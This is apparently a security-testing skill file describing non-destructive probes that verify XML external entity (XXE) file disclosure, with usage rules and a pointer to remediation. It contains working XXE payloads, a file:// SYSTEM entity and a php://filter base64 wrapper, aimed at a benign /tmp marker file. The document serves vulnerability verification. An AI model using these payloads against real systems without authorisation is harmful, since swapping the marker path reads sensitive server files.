# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`xxe-file-disclosure`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `xxe-file-disclosure`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### In-band read of a benign marker

**Expected differential:** a SYSTEM entity to a placed benign marker returns it at the reflection point, which the plain document did not contain

```text
<!DOCTYPE fd [<!ENTITY read SYSTEM "file:///tmp/xxefd-marker.txt">]><doc><note>&read;</note></doc>
```

### PHP wrapper for encoding safety

**Expected differential:** a php://filter base64 wrapper returns encoded bytes of a benign file, succeeding where a raw file:// read truncated

```text
<!ENTITY read SYSTEM "php://filter/convert.base64-encode/resource=/tmp/xxefd-marker.txt">
```

### Multi-line constraint check

**Expected differential:** a single-line read returns while a multi-line read truncates, confirming the newline constraint rather than absence of the bug

```text
xxefd read a single-line marker file then a multi-line marker file and compare reflected output
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
